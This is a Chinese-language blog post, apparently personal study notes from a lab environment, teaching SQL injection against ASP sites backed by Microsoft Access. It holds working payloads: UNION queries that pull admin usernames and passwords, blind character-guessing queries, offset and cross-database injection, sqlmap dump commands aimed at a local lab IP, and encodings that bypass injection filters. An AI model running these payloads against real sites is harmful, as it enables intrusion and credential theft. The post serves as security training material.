@@ -1,0 +1,585 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="ZeroRestart" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      access注入 
+      
+      
+      |
+    
+     ZeroRestart&#39;s Blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.ico">
+    <link rel="icon" href="/images/favicon.ico">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/color-scheme.css">
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+<link rel="stylesheet" href="/css/comments.css">
+
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">ZeroRestart</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">access注入</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="更新时间"></i>
+          2022-01-01 22:48:00
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="标签"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="学习笔记">
+                    <b>#</b> 学习笔记
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <meta name="referrer" content="no-referrer" />
+
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><ol>
+<li>代码没有对恶意注入语句进行过滤</li>
+<li>注入语句 根据数据库不同，使用不同的注入语句</li>
+</ol>
+<p>access数据库结构  <strong>表 — 列  — 内容</strong> 没有数据库</p>
+<p><strong>常见组合</strong><br>​</p>
+<p>asp + access/mssql/oracle<br>aspx + access/mssql/oracle<br>php   + mysql/postgresql/oracle<br>jsp  + mssql/mysql/oracle </p>
+<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>有参数传递<br>和数据库交互<br>可以控制<br>​</p>
+<p>使用工具扫描<br>sqlmap/awvs/xray<br>​</p>
+<p><strong>手工判断</strong></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/ 和 -<span class="number">0</span>  +<span class="number">1</span> </span><br><span class="line">单引号 &#x27;  看是否报错</span><br><span class="line">and <span class="number">1</span>=<span class="number">1</span>  and <span class="number">1</span>=<span class="number">2</span>  看回显</span><br></pre></td></tr></table></figure>
+
+
+<p><strong>判断数据库类型</strong></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and exists (select * <span class="selector-tag">from</span> msysobjects)&gt;<span class="number">0</span>    access</span><br><span class="line">and exists (select * <span class="selector-tag">from</span> sysobjects)&gt;<span class="number">0</span>     sqlserver</span><br></pre></td></tr></table></figure>
+<p>判断表和列</p>
+<p>常见表<br><code>admin,user,users,admin_user,manager,admin_name,manage_user,manage_name,adminusrnam</code><br>​</p>
+<p>常见管理员列<br><code>admin,admin_user,admin_name,admin_usr,usr,user,usernam</code>e<br>​</p>
+<p>常见密码列<br> <code>password,passwd,pwd,admin_pass,admin_pwd,pss</code><br>​</p>
+<p><strong>判断语句</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">exists</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表<span class="operator">/</span>列) </span><br></pre></td></tr></table></figure>
+
+
+<p><strong>判断列数</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> <span class="number">22</span>  <span class="operator">/</span><span class="operator">/</span>如果回显正常说明为<span class="number">22</span>列</span><br></pre></td></tr></table></figure>
+<h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">查看字符位</span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span> <span class="keyword">from</span> admin</span><br><span class="line"></span><br><span class="line">查内容</span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,admin,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,password,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span> <span class="keyword">from</span> admin</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>表 和 列 可以去<strong>看前端登入表单的id</strong><br><img src="https://cdn.nlark.com/yuque/0/2021/png/2459034/1640963777721-e68bf774-fcab-4c97-bb7d-85ea25550c79.png#clientId=u58a3f676-4a29-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=395&id=u1ee16db7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=789&originWidth=1800&originalType=binary&ratio=1&rotation=0&showTitle=false&size=87596&status=done&style=none&taskId=u43e3f5ac-b607-4059-af87-2454c19021a&title=&width=900" alt="image.png"></p>
+<h2 id="逐字猜解法"><a href="#逐字猜解法" class="headerlink" title="逐字猜解法"></a>逐字猜解法</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2459034/1641019005911-f2d8ea39-9406-4314-8d4d-363eac95b18e.png#clientId=u58a3f676-4a29-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=386&id=ue840a3a0&margin=%5Bobject%20Object%5D&name=image.png&originHeight=799&originWidth=1214&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1414573&status=done&style=none&taskId=u22de2712-0ec0-40a3-b245-a67773281c9&title=&width=586" alt="image.png"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">判断账户密码的长度</span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> len(admin) <span class="keyword">from</span> admin) <span class="operator">&gt;</span> <span class="number">5</span>   <span class="operator">/</span><span class="operator">/</span>如果返回正常说明管理员账户的长度为<span class="number">5</span></span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> len(password) <span class="keyword">from</span> admin)<span class="operator">=</span><span class="number">32</span> <span class="operator">/</span><span class="operator">/</span>猜解管理密码长度是否为等于<span class="number">32</span> （MD5加密）</span><br><span class="line"></span><br><span class="line">根据刚才爬到的长度逐字猜解</span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="keyword">asc</span>(mid(admin,<span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">from</span> admin)<span class="operator">=</span><span class="number">97</span> <span class="operator">/</span><span class="operator">/</span> 第一列第一个字符 为 ASCII <span class="number">97</span> <span class="operator">=</span> a</span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="keyword">asc</span>(mid(admin,<span class="number">2</span>,<span class="number">1</span>)) <span class="keyword">from</span> admin)<span class="operator">=</span><span class="number">100</span> <span class="operator">/</span><span class="operator">/</span> 第一列第二个字符为 ASCII <span class="number">100</span> <span class="operator">=</span> d</span><br><span class="line">以此类推密码也是如此 </span><br><span class="line"></span><br><span class="line">碰到这种如果没网址waf直接上工具跑就完了</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="注入工具"><a href="#注入工具" class="headerlink" title="注入工具"></a>注入工具</h2><p><strong>sqlmap</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">检测是否存在注入，和注入类型</span><br><span class="line">sqlmap <span class="operator">-</span>u &quot;http://192.168.8.131:8037/shownews.asp?id=51&quot;</span><br><span class="line">查看所有表</span><br><span class="line">sqlmap <span class="operator">-</span>u &quot;http://192.168.8.131:8037/shownews.asp?id=51&quot; <span class="comment">--tables</span></span><br><span class="line">查看表里的列</span><br><span class="line">sqlmap <span class="operator">-</span>u &quot;http://192.168.8.131:8037/shownews.asp?id=51&quot; <span class="operator">-</span>T &quot;表名&quot; <span class="comment">--columns</span></span><br><span class="line">查看数据</span><br><span class="line">sqlmap <span class="operator">-</span>u &quot;http://192.168.8.131:8037/shownews.asp?id=51&quot; <span class="operator">-</span>T &quot;admin&quot; <span class="operator">-</span>C &quot;admin,password&quot; <span class="comment">--dump</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/2459034/1641019285551-6bb41e56-fdbe-46b0-8693-94a689a102f4.png#clientId=u58a3f676-4a29-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=97&id=u501801a0&margin=%5Bobject%20Object%5D&name=image.png&originHeight=193&originWidth=1125&originalType=binary&ratio=1&rotation=0&showTitle=false&size=181306&status=done&style=none&taskId=uacb3208a-ccec-4b35-8ece-47080ffb7dd&title=&width=562.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/2459034/1641019644134-e13495f1-9552-425d-b348-60ea9d1f9967.png#clientId=u58a3f676-4a29-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=240&id=u34b39121&margin=%5Bobject%20Object%5D&name=image.png&originHeight=480&originWidth=603&originalType=binary&ratio=1&rotation=0&showTitle=false&size=252650&status=done&style=none&taskId=u4d19d5b6-658a-43d8-8349-c806e18605f&title=&width=301.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/2459034/1641019863190-895fbb8e-e65b-4014-b5af-5cd359a65a93.png#clientId=u58a3f676-4a29-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=151&id=u255a1d1d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=302&originWidth=626&originalType=binary&ratio=1&rotation=0&showTitle=false&size=205948&status=done&style=none&taskId=uc017d4ff-8da3-40c7-8931-108e9f07913&title=&width=313" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/2459034/1641019928598-b8a0b385-6c19-45bf-a2da-b8323d2c4200.png#clientId=u58a3f676-4a29-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=124&id=ue29d9838&margin=%5Bobject%20Object%5D&name=image.png&originHeight=248&originWidth=737&originalType=binary&ratio=1&rotation=0&showTitle=false&size=187527&status=done&style=none&taskId=ub16f64d3-5d08-43a1-a338-b128a20f087&title=&width=368.5" alt="image.png"></p>
+<p>密码拿去md5网站解密即可</p>
+<h2 id="偏移注入"><a href="#偏移注入" class="headerlink" title="偏移注入"></a>偏移注入</h2><p><strong>使用条件</strong><br><em>知道表，但不知道列的情况下使用偏移注入</em><br><em>​</em></p>
+<p>偏移注入完全靠的是运气，因为偏移出来的数据是随机的<br>​</p>
+<blockquote>
+<p>用 * 代替字段长度<br>用 * 号从最后一个字段数22向前逐个删除来代替，直到显示正常为止，* 代表了所有admin表的字段</p>
+</blockquote>
+<p>公式：<br>27+11 = 38<br>16+11<em>2=38<br>5+11</em>3 = 38</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>第一次<span class="operator">*</span>号逐个减，直到回显数据。 （这里减了<span class="number">11</span>个数）</span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">33</span>,<span class="number">34</span>,<span class="number">35</span>,<span class="number">36</span>,<span class="number">37</span>,<span class="operator">*</span> <span class="keyword">from</span> admin</span><br><span class="line"></span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="operator">*</span> <span class="keyword">from</span> admin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>第二次在减<span class="number">11</span>个数，后套公式</span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="operator">*</span> <span class="keyword">from</span> (admin <span class="keyword">as</span> a <span class="keyword">inner</span> <span class="keyword">join</span> admin <span class="keyword">as</span> b <span class="keyword">on</span> a.id<span class="operator">=</span>b.id)</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>第三次继续减<span class="number">11</span>，后套公式</span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="operator">*</span> <span class="keyword">from</span> ((admin <span class="keyword">as</span> a <span class="keyword">inner</span> <span class="keyword">join</span> admin <span class="keyword">as</span> b <span class="keyword">on</span> a.id<span class="operator">=</span>b.id) <span class="keyword">inner</span> <span class="keyword">join</span> admin <span class="keyword">as</span> c <span class="keyword">on</span> a.id<span class="operator">=</span>c.id)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>如果还不行就这么加</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,a.id,b.id,c.id,<span class="operator">*</span> <span class="keyword">from</span> ((admin <span class="keyword">as</span> a <span class="keyword">inner</span> <span class="keyword">join</span> admin <span class="keyword">as</span> b <span class="keyword">on</span> a.id<span class="operator">=</span>b.id) <span class="keyword">inner</span> <span class="keyword">join</span> admin <span class="keyword">as</span> c <span class="keyword">on</span> a.id<span class="operator">=</span>c.id)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p> <img src="https://cdn.nlark.com/yuque/0/2022/png/2459034/1641033372067-0e8ce603-5a4e-470f-9e89-5b93665c28f7.png#clientId=ud827eab0-2fbb-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=339&id=uab9cabc9&margin=%5Bobject%20Object%5D&name=image.png&originHeight=678&originWidth=1117&originalType=binary&ratio=1&rotation=0&showTitle=false&size=79093&status=done&style=none&taskId=ue649ccce-c84b-4141-9a9e-6c3541a1e0d&title=&width=558.5" alt="image.png"></p>
+<p>除了偏移之外，也可以试试查看后台表单的代码，命名，也可能和数据库列名对应<br>​</p>
+<h2 id="跨库查询"><a href="#跨库查询" class="headerlink" title="跨库查询"></a>跨库查询</h2><p>当前网站没有sql注入，但是知道此网站数据库物理路径，那么就可以找同服务器的其它存在注入的站点，跨库查询<br>例如： a不存在注入，b存在，使用b查询a数据库里的数据 a和b在同一个站点<br><strong>条件</strong><br>绝对路径： [C:/inetpub/sql_inject/access_sql/Database/%23Data.mdb]<br>知道a数据库的表名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span><span class="keyword">order</span> <span class="keyword">by</span> 为当前存在注入的字段数</span><br><span class="line"></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.8</span><span class="number">.131</span>:<span class="number">8003</span><span class="operator">/</span>fwxm_detail.asp?id<span class="operator">=</span><span class="number">31</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,admin,password,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> <span class="keyword">from</span> [C:<span class="operator">/</span>inetpub<span class="operator">/</span>sql_inject<span class="operator">/</span>access_sql<span class="operator">/</span>Database<span class="operator">/</span><span class="operator">%</span><span class="number">23</span>Data.mdb].admin</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/2459034/1641040013400-8260fd45-6c8e-4d54-81b6-3e9d90f097e6.png#clientId=u1d265e66-c77d-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=345&id=uc335339b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=690&originWidth=1678&originalType=binary&ratio=1&rotation=0&showTitle=false&size=230368&status=done&style=none&taskId=u3052a3ba-5b63-4f13-927e-4b7f6fef8ab&title=&width=839" alt="image.png"></p>
+<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><h2 id="通用性防注入代码绕过"><a href="#通用性防注入代码绕过" class="headerlink" title="通用性防注入代码绕过"></a>通用性防注入代码绕过</h2><p>1.弹窗式防注入<br>可以尝试更换提交方式 get，post，cookie<br>2.代码防御</p>
+<ul>
+<li>+号代替空格</li>
+<li>%0a , %a0 代替空格</li>
+<li>%%%0aa%%%%nd%0a1=1</li>
+<li>%%%%0aa%%%%%nd+1=1</li>
+<li>大小写 AnD 1=1</li>
+</ul>
+<p>3.url编码</p>
+<ul>
+<li><img src="https://cdn.nlark.com/yuque/0/2022/png/2459034/1641040352351-47934f84-ce17-4475-aa30-845aa40aff5d.png#clientId=u1d265e66-c77d-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=53&id=u8ba1306b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=105&originWidth=861&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11319&status=done&style=none&taskId=u8c75a858-f87c-43b0-a9ec-9c5a61301b2&title=&width=430.5" alt="image.png"></li>
+</ul>
+<p>4.混合使用</p>
+<ul>
+<li>%0a,+ %%%%0a,提交方式,大小写 搭配使用</li>
+<li>%%%%%0aAnD+1=1 </li>
+</ul>
+<h2 id="cookie注入绕过"><a href="#cookie注入绕过" class="headerlink" title="cookie注入绕过"></a>cookie注入绕过</h2><p>工具：注入中转生成器 + 手工<br>​</p>
+<p>碰到弹窗拦截，可以尝试使用cookie注入进行绕过<br><img src="https://cdn.nlark.com/yuque/0/2022/png/2459034/1641048104314-0217a8e9-61a2-49da-b97a-e45e7002ac3c.png#clientId=u1d265e66-c77d-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=275&id=u3216592f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=550&originWidth=966&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31307&status=done&style=none&taskId=ub6881367-10f9-401e-83ef-d89a009370b&title=&width=483" alt="image.png"><br>​</p>
+<ol>
+<li>打开工具，生成中转页面</li>
+</ol>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/2459034/1641048149431-cfa842fe-5a33-466f-a51a-86d4ae00d4ad.png#clientId=u1d265e66-c77d-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=266&id=u4d7cfd40&margin=%5Bobject%20Object%5D&name=image.png&originHeight=531&originWidth=944&originalType=binary&ratio=1&rotation=0&showTitle=false&size=44751&status=done&style=none&taskId=ua4ece98d-47a7-449e-9287-13480ff2e9b&title=&width=472" alt="image.png"></p>
+<ol start="2">
+<li>打开生成的页面，然后常规注入</li>
+</ol>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/2459034/1641048241329-05450884-99ce-4699-92bf-0445f4427098.png#clientId=u1d265e66-c77d-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=314&id=u1ae7389f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=627&originWidth=1446&originalType=binary&ratio=1&rotation=0&showTitle=false&size=83145&status=done&style=none&taskId=u599f7203-2ba4-48ea-8e35-2b691ff9567&title=&width=723" alt="image.png"><br>​</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2021/12/28/crecar%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/3.msf%E4%BD%BF%E7%94%A8/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="更新时间"></i>
+              2022-01-01 22:48:00
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="标签"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="学习笔记">
+                        <b>#</b> 学习笔记
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-text">联合查询注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%90%E5%AD%97%E7%8C%9C%E8%A7%A3%E6%B3%95"><span class="toc-text">逐字猜解法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7"><span class="toc-text">注入工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5"><span class="toc-text">偏移注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%A8%E5%BA%93%E6%9F%A5%E8%AF%A2"><span class="toc-text">跨库查询</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-text">绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E7%94%A8%E6%80%A7%E9%98%B2%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-text">通用性防注入代码绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cookie%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87"><span class="toc-text">cookie注入绕过</span></a></li></ol></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+
+  <div id="vcomments"></div>
+
+  <script>
+    new Valine({
+      el: '#vcomments',
+      appId: 'AJPST8AlszUhppXoNjsA7kyD-gzGzoHsz',
+      appKey: 'QhSl0X5FDQbqN3mjUYOiSicH',
+      placeholder: 'Welcome!',
+      avatar: 'retro',
+      lang: 'zh-CN'
+    })
+  </script>
+
+    <style>
+      .comments-container .v .vempty {
+        display: none!important;
+      }
+    </style>
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        <div class="footer">
+  
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://zerorestart.github.io/">Copyright © ZeroRestart 2021</a>
+        
+    </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://zerorestart.github.io/">Powered by ZeroRestart</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
